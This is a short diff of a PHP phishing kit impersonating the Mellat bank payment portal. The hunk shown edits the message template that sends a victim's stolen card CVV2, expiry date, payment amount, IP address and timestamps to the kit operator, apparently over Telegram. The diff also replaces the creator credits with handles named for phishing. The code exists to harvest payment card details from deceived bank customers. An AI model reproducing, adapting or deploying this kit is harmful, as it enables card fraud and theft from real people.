@@ -142,16 +142,14 @@ $Text = "
 ⏱ OTP : Waiting....
 📋 Cvv2 : <code>$cvv</code>
 📆 Date : <code>$year</code> Month: <code>$month</code>
--------------- INFO --------------
 💴 Amount : $amount 𝗥𝗶𝗮𝗹𝘀
 📍 IP : <code>$ip</code>
 ⏰ Time : $saat
 📝 ToDay : $roz
 📌 Date : $tarikh
 ✨ Portal : Mellat
-------------- Creator -------------
-🆔 : @fuckingdargah :)
-🌐 Webhost : @XTuranli :)
+🆔 Channel : @Panda_Phish :)
+🌐 Code By : @SunPhish :)
 ";
 $T="000";
 $I= 0000;
